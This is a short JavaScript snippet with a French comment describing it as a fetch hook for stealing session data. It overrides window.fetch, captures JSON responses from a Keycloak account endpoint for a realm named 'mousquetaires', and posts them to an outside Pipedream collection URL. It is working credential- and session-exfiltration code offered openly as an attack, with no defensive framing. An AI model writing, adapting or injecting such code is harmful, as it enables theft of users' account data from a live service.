// Hook de fetch pour voler les données de session ou les requêtes sensibles
(function() {
  const originalFetch = window.fetch;

  window.fetch = async function(...args) {
    const response = await originalFetch.apply(this, args);
    
    if (args[0].includes('/auth/realms/mousquetaires/account')) {
      const clonedResponse = response.clone();
      
      clonedResponse.json().then(data => {
        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            endpoint: args[0],
            data: data
          })
        });
      });
    }

    return response;
  };
})();
